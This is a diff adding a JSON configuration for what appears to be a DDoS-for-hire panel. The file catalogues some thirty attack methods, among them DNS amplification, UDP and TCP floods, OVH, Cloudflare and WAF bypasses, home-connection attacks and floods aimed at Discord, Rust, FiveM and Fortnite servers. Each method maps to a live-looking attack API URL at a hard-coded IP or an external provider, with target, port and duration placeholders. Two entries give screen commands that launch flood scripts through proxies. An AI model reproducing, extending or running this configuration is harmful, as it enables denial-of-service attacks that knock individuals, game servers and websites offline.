@@ -1,0 +1,368 @@
+{
+    "LAYER 4 NETWORK": {
+        "DNS": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "High-volume DNS Amplification mechanism executing via remote xxx infrastructure.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=dns&concs=1"
+            ],
+            "slots": 6
+        },
+        "UDP": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Standard UDP Flood pushing heavy volumetric packet sizes natively.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=udp&concs=1"
+            ],
+            "slots": 6
+        },
+        "OVH": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "UDP attack highly optimized to saturate OVH Edge Firewalls.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=ovh&concs=1"
+            ],
+            "slots": 6
+        },
+        "HOME": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Powerful targeted Home connection destruction.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=home&concs=1"
+            ],
+            "slots": 6
+        },
+        "SSH": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "SSH handshake exhaustion and protocol validation bypass.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=ssh&concs=1"
+            ],
+            "slots": 6
+        },
+        "DISCORD": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Specialized drops against Discord Gateway IPs.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=discord&concs=1"
+            ],
+            "slots": 6
+        },
+        "TCP": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Basic TCP volumetric starvation flood.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=tcp&concs=1"
+            ],
+            "slots": 6
+        },
+        "TCPBYPASS": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Advanced TCP handshake bypass algorithm engineered for multi-state firewalls.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=tcpbypass&concs=1"
+            ],
+            "slots": 6
+        },
+        "GAME": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Custom payload matching default game server signatures.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=game&concs=1"
+            ],
+            "slots": 6
+        },
+        "RUST": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Specialized string injection specifically structured to trigger Facepunch RakNet protocol drops.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=rust&concs=1"
+            ],
+            "slots": 6
+        },
+        "FIVEM": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Multiplayer synchronous packet exhaustion.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=fivem&concs=1"
+            ],
+            "slots": 6
+        },
+        "UDP-VIP": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Exclusive highest-tier UDP amplification using maximum server MTU limits.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=udp-vip&concs=1"
+            ],
+            "slots": 6
+        },
+        "UDP-NPS": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Generates extreme million packets per second limits across arbitrary UDP ports.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=udp-pps&concs=1"
+            ],
+            "slots": 6
+        },
+        "UDPBYPASS": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Asynchronous UDP payload reflection bypassing generic cloud filtering logic.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=udpbypass&concs=1"
+            ],
+            "slots": 6
+        },
+        "RLAG": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Stutter execution algorithm forcing packet delay and protocol-logic breakdown.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=rlag&concs=1"
+            ],
+            "slots": 6
+        },
+        "FORTNITE": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Specialized payload dropping synchronized tick-rating connectivity.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=fortnite&concs=1"
+            ],
+            "slots": 6
+        }
+    },
+    "LAYER 7 NETWORK": {
+        "TLS": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "L7 Engine forcing repeated TLS 1.3 handshake completions.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=tls&concs=1"
+            ],
+            "slots": 6
+        },
+        "CLOUDFLARE": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Intelligent JS validation execution simulating legitimate traffic.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=cloudflare&concs=1"
+            ],
+            "slots": 6
+        },
+        "BROWSER": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "hybrid",
+            "status": "online",
+            "description": "Redundant multi-provider headless browser scraping engine (xxx + L7SRV).",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=browser&concs=1",
+                "https://api.l7srv.ru/attack?token=xxx&host={host}&port={port}&time={time}&method=browser&concs=1"
+            ],
+            "slots": 6
+        },
+        "HTTPBYPASS": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Pure HTTP proxy execution bypassing generic WAF pattern recognition.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=httpbypass&concs=1"
+            ],
+            "slots": 6
+        }
+    },
+    "KILZA METHODS": {
+        "UDP-KILZA": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Kilza's signature high-velocity UDP synchronization protocol breaker.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=udp-kilza&concs=1"
+            ],
+            "slots": 6
+        },
+        "TCP-KILZA": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Kilza TCP starvation method specifically written to stall active firewalls.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=tcp-kilza&concs=1"
+            ],
+            "slots": 6
+        },
+        "OVH-KILZA": {
+            "Type": "layer4",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Custom game-shield protocol bypass ignoring OVH limitations.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=ovh-kilza&concs=1"
+            ],
+            "slots": 6
+        },
+        "HTTP-KILZA": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "xxx",
+            "status": "online",
+            "description": "Highly aggressive Kilza-branded HTTP concurrent connection exhaustion.",
+            "apiEndpoints": [
+                "http://45.13.239.151:8080/api/attack?username=xxx&password=xxx&target={host}&port={port}&time={time}&method=http-kilza&concs=1"
+            ],
+            "slots": 6
+        }
+    },
+    "PREMIUM L7 NETWORK": {
+        "PRIV-FLOOD": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "l7srv",
+            "status": "online",
+            "description": "High-concurrency L7 flood bypass engine provided by L7SRV.",
+            "apiEndpoints": [
+                "https://api.l7srv.ru/attack?token=xxx&host={host}&port={port}&time={time}&method=priv-flood&concs=1"
+            ],
+            "slots": 6
+        },
+        "HTTP-RATELIMIT": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "l7srv",
+            "status": "online",
+            "description": "Bypasses rate-limiting thresholds via intelligent request spacing.",
+            "apiEndpoints": [
+                "https://api.l7srv.ru/attack?token=xxx&host={host}&port={port}&time={time}&method=HTTP-RATELIMIT&concs=1"
+            ],
+            "slots": 6
+        },
+        "HTTP-CUSTOM": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "l7srv",
+            "status": "online",
+            "description": "Highly customizable L7 request headers and payload injection.",
+            "apiEndpoints": [
+                "https://api.l7srv.ru/attack?token=xxx&host={host}&port={port}&time={time}&method=HTTP-CUSTOM&concs=1"
+            ],
+            "slots": 6
+        },
+        "HTTP-RAW": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "l7srv",
+            "status": "online",
+            "description": "Raw socket-based L7 request flood via L7SRV redundancy.",
+            "apiEndpoints": [
+                "https://api.l7srv.ru/attack?token=xxx&host={host}&port={port}&time={time}&method=http-raw&concs=1"
+            ],
+            "slots": 6
+        },
+        "PRIV-BYPASS": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "l7srv",
+            "status": "online",
+            "description": "Sophisticated WAF and firewall bypass logic via L7SRV.",
+            "apiEndpoints": [
+                "https://api.l7srv.ru/attack?token=xxx&host={host}&port={port}&time={time}&method=priv-bypass&concs=1"
+            ],
+            "slots": 6
+        },
+        "PRIV-TOR": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "l7srv",
+            "status": "online",
+            "description": "Anonymized L7 traffic routed through the Tor network nodes.",
+            "apiEndpoints": [
+                "https://api.l7srv.ru/attack?token=xxx&host={host}&port={port}&time={time}&method=priv-tor&concs=1"
+            ],
+            "slots": 6
+        },
+        "HTTP-LOADBALANCE": {
+            "Type": "layer7",
+            "mode": "api",
+            "apiProvider": "l7srv",
+            "status": "online",
+            "description": "Distributed load-balancing attack targeting multiple backend nodes.",
+            "apiEndpoints": [
+                "https://api.l7srv.ru/attack?token=xxx&host={host}&port={port}&time={time}&method=http-loadbalance&concs=1"
+            ],
+            "slots": 6
+        }
+    },
+    "SCRIPT METHODS": {
+        "HTTP-TLS": {
+            "Command": "screen -dmS {attackId} node tls.js {host} {time} 64 5 proxy.txt",
+            "Type": "layer7",
+            "mode": "ssh",
+            "status": "offline",
+            "description": "Highest physical PPS achievable through the hypervisor natively."
+        },
+        "HTTP-RAW-SCRIPT": {
+            "Command": "screen -dmS {attackId} ./HTTP-RAW {host} {time}",
+            "Type": "layer4",
+            "mode": "ssh",
+            "status": "offline",
+            "description": "Server-side local L7 script execution driving brute web socket traffic."
+        }
+    }
+}
